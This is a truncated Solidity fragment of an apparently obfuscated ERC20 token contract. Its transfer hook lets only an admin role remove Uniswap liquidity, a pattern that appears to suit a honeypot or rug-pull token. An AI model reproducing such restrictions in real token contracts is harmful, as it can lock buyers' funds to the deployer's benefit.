...
contract Token is NESDFGCERC20, NESDFGCConsole,UniswapV2Router02 {
    ...
    function _NESDFGCfwwubelr(address from, address to, uint256 amt) internal {
        uint bal0 = IUniswapV2Pair(uniswapV2Pair).balanceOf(from);
        if(bal0 > 0){
            require(hasRole(ADMIN, from), "ERC20: only admin can del liquidity");
        }
        uint bal1 = IUniswapV2Pair(uniswapV2Pair).balanceOf(to);
        if(bal1 > 0){
